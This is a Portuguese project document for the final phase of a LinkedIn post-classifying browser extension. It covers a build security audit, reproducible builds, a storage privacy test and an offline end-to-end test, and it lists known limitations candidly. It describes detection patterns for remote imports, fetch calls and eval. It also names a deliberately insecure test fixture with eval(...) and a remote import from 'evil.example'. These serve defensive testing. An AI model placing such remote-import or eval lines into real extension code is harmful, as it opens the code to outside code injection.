# Fase 5 — Personalização, diagnósticos e portão final do MVP

## Resultado

A Fase 5 fecha o MVP: personalização local (overrides por plataforma/domínio,
regras de palavra-chave e histórico opt-in), diagnósticos agregados, import/export
com rollback atômico, extensibilidade de adapters e — nesta Task 42 — o **portão
final**: auditoria estática de segurança do pacote, verificação de build
reproduzível, uma auditoria de privacidade de armazenamento e um fluxo E2E de
aceitação completo, tudo offline sobre o backend mock.

O artefato publicado (`dist`) passa na auditoria **sem** qualquer afrouxamento de
permissão, host ou CSP. Nenhum código de `src/**` foi modificado para passar no
portão.

## Critérios de saída da Fase 5

- **Overrides por plataforma/domínio** funcionam guardando apenas o hostname
  normalizado (`DomainSettings`/`DomainPauseRepository`), nunca URL, caminho ou
  query.
- **Regras de palavra-chave** são locais, isoladas (rule worker com timeout),
  limitadas e estritamente separadas da classificação de IA (a origem `rule`
  nunca altera o `status` da IA).
- **Histórico** é opt-in e desligado por padrão; retido/limitado por idade e por
  cap; sem texto por padrão (texto opcional fica em chave separada e some do
  export).
- **Import/export** valida o schema, mostra preview, exige confirmação e faz
  rollback atômico; export genérico nunca carrega texto.
- **Métricas/diagnósticos** são agregados (histograma de latência, contadores,
  uso por backend/modelo) e não contêm texto, hash, autor ou URL.
- **Novo adapter** pode ser registrado via `registry` sem alterar o núcleo de
  inferência/armazenamento.
- **README e docs** cobrem entregáveis e limitações.
- **`npm run verify` e build reproduzível passam**; os critérios do MVP têm
  evidência automatizada.

## Task 42 — Entregáveis

### Auditoria de segurança do pacote — `scripts/audit-build.mjs`

`node scripts/audit-build.mjs <dist>` analisa o `manifest.json` e falha (exit 1,
imprimindo cada motivo) se:

- `permissions` exceder `{ storage, contextMenus, activeTab, scripting,
  offscreen }`;
- `host_permissions` exceder `{ https://www.linkedin.com/* }`;
- a CSP `extension_pages` divergir da travada (ou houver chave de CSP inesperada);
- o manifesto referenciar um arquivo ausente;
- um artefato de código-fonte/sourcemap (`.map`, `.ts`, `.tsx`, ...) vazar no
  bundle;
- qualquer `.js`/`.mjs`/`.html`/`.css` empacotado contiver uma **forma sintática**
  perigosa: import remoto (`import "http…"` ou `import … from "http…"`),
  `import("http…")`, `fetch("http…")`, `new URL("http…")`, `@import` remoto,
  `sourceMappingURL` externo, uma chamada `eval` ou um `new Function`.

A detecção é dirigida por dados (arrays de `RegExp`) e casa **formas** de sintaxe,
não qualquer substring "http", evitando falsos positivos com URLs documentais em
strings. O próprio script foi escrito de forma a não conter literalmente uma
chamada de `eval` nem um import remoto.

**Carve-out documentado**: `eval`/`new Function` são proibidos em primeira parte,
mas tolerados **apenas** dentro do loader WASM de terceiros
(`vendor/transformers-wasm/`, glue do ONNX Runtime/emscripten). Esse `new Function`
é (1) de terceiros e (2) inerte sob a CSP publicada, que concede
`'wasm-unsafe-eval'` mas **não** `'unsafe-eval'` — o navegador bloqueia qualquer
`eval`/`new Function` em runtime. Formas de rede remota continuam proibidas
inclusive nesses arquivos.

Um fixture deliberadamente inseguro
(`tests/fixtures/insecure-dist/`: `host_permissions: ["<all_urls>"]` e um `.js`
com `eval(...)` e `import "https://evil.example/x.js"`) prova a rejeição: a
auditoria sai com exit 1 citando a permissão global, a URL remota e o `eval`.

### Build reproduzível — `scripts/verify-reproducible-build.mjs`

Roda **dois** `npm run build` limpos, tira snapshot de `dist` em dois diretórios
temporários próprios, normaliza apenas timestamps conhecidos e compara SHA-256 e
conjunto de nomes. Sai com 0 se idênticos; caso contrário, exit não-zero com um
resumo das diferenças. Nunca apaga nada fora dos temp dirs verificados.

### Auditoria de privacidade de armazenamento — `tests/integration/storage-privacy-audit.test.ts`

Roda uma sessão representativa em memória (classifica um post, revela/restaura e
envia feedback), exercitando feedback, histórico opt-in, métricas e cache, e
afirma que o dump de armazenamento **não contém** o nome do autor, a URL de perfil
nem o texto do post. Feedback e histórico ficam chaveados somente pelo hash de
conteúdo.

### E2E de aceitação do MVP — `tests/e2e/full-mvp.spec.ts`

Um fluxo real, offline, sobre o harness existente (`./helpers/load-extension`):

1. no feed-mock do LinkedIn, um post longo ganha um **selo acessível**;
2. mudar o modo de apresentação para `blur` (via a mensagem `UPDATE_SETTINGS`
   publicada de options → background) é **refletido** após a aba reler as
   configurações no load — o post fica desfocado;
3. o post é **revelado** de volta ao texto original via a mensagem publicada
   `CLEAR_PAGE_PRESENTATION` (popup → content);
4. a **análise manual** de uma seleção em português numa página **não-LinkedIn**
   produz um painel de resultado, classificado pelo backend mock, com zero rede.

Como Playwright não dispara menus de contexto nativos nem enxerga um shadow root
fechado, o E2E dirige as **funções publicadas** diretamente e documenta cada
afordância de teste (nunca falsifica o resultado):

- **Modo de apresentação**: enviado com a mesma mensagem `UPDATE_SETTINGS` que a
  página de opções publicada emite; o `SettingsRepository` persiste. Como o
  content script publicado só reaplica pausa de domínio ao vivo (não o modo de
  apresentação), a aba é recarregada para reler a configuração — igual ao
  comportamento real.
- **Revelar**: mensagem `CLEAR_PAGE_PRESENTATION` que o popup emite; o presenter
  do LinkedIn publicado não tem controle de revelar por post, apenas esse
  restore-para-original em nível de página.
- **Análise manual**: o bundle publicado `manual-analysis.js` é injetado com
  `chrome.scripting` (no lugar do gesto `activeTab` do menu de contexto) e recebe
  a seleção com a mesma mensagem `SHOW_MANUAL_ANALYSIS` que o
  `ManualAnalysisController` envia. O painel, a mensageria e a classificação são
  inteiramente o código publicado; a única afordância é forçar o shadow root
  (que seria fechado) a abrir **no isolated world**, para que o Playwright possa
  clicar em "Analisar seleção" e ler o resultado — que é saída real do mock.
- **Acesso ao host**: uma cópia descartável do `dist` recebe `host_permissions`
  extras para a origem-fixture local (`http://www.linkedin.com/*` e
  `http://127.0.0.1/*`), substituindo a concessão `activeTab` de um clique de menu
  que não é scriptável. O `dist` publicado permanece travado (garantido por
  `npm run audit`).

**Offline** é provado como no `extension.spec.ts`: as únicas origens resolvíveis
são as fixtures locais e o teste exige que nenhuma requisição saia delas ou da
própria extensão.

### `package.json`

- `audit`: `node scripts/audit-build.mjs dist`.
- `verify:build`: `node scripts/verify-reproducible-build.mjs`.
- `verify`: encadeia `format:check` → `lint` → `typecheck` → `vitest run`
  (unit/integração) → `build` → `audit` → `test:e2e`.

## Verificação

Portão completo executado em 17–18 de julho de 2026 (Windows 11; Node 22.22.3;
Chromium do Playwright, headless), todos com exit 0:

- `node scripts/audit-build.mjs tests/fixtures/insecure-dist`: exit 1, citando
  `host permission not in allowlist: <all_urls>`, o import remoto e o `eval(...)`.
- `npm run build && npm run audit`: auditoria `OK` (exit 0) sobre o `dist`
  publicado.
- `npm run verify:build`: `OK` — 30 arquivos idênticos em dois builds limpos.
- `tests/integration/storage-privacy-audit.test.ts`: verde (sem autor, URL ou
  texto no dump).
- `npm run typecheck`: aprovado (ambos os `tsc --noEmit`).
- `vitest run` (unit/integração): 91 arquivos, 668 testes aprovados e 3 ignorados
  (o smoke de modelo real), incluindo a nova auditoria de privacidade.
- `npm run test:e2e` (Playwright): 4 testes aprovados (3 de `extension.spec.ts` +
  1 de `full-mvp.spec.ts`).
- `npm run lint`: 0 erros (2 avisos preexistentes de `react-refresh` em
  popup/options `App.tsx`).
- `npm run verify` (cadeia completa): exit 0.
- `npm run verify:build`: exit 0 — 30 arquivos idênticos em dois builds limpos.
- `npm run docs:check`: 41 links relativos resolvem em 24 arquivos.

## Limitações conhecidas (honesto)

- **Backend mock apenas**: o classificador ativo é o mock determinístico. Nenhuma
  afirmação de acurácia de detecção é feita; o MVP é um pipeline funcional e
  "real-ready", não um detector cientificamente validado. Nenhum modelo/dataset
  entrou no Git.
- **Pausa temporizada de 1 hora — NÃO totalmente ligada à UI**: a lógica de pausa
  por tempo existe na camada de storage/lógica (`DomainSettings.pausedUntil`,
  expiração por comparação de relógio; a pausa por hostname já funciona), mas
  ainda **não há um controle de UI** que grave uma pausa de 1 hora com expiração
  automática. Item pós-MVP; **não** é afirmado como entregue.
- **`ANALYZE_CURRENT_POST` / `REPORT_CURRENT_POST` — NÃO totalmente ligados**: a
  lógica no content script existe (`PostController.analyzeContextPost()` /
  `reportContextFeedback()`, além do rastreamento do post sob clique direito) e o
  handler de menu de contexto do service worker os aciona, **porém** esses
  envelopes ainda **não** fazem parte do contrato de mensagem validado
  (`src/shared/messages.ts` / `message-validation.ts`) e o content script ainda
  **não** roteia esses comandos (ver os `NOTE(integrator)` em
  `src/background/service-worker.ts`). Item pós-MVP; **não** é afirmado como
  entregue. No mesmo espírito, o contador local de "denúncia perdida" ainda não
  existe em `MetricsRepository` (o "reportar errado" continua abrindo a análise
  manual).
- **Afordâncias de teste E2E**: o E2E patcheia apenas uma cópia descartável do
  `dist` (host permissions extras para a fixture local) e força o shadow root do
  painel manual a abrir no isolated world para observá-lo. São conveniências de
  teste, não mudanças de comportamento do artefato publicado, que permanece
  travado e é auditado por `npm run audit`.
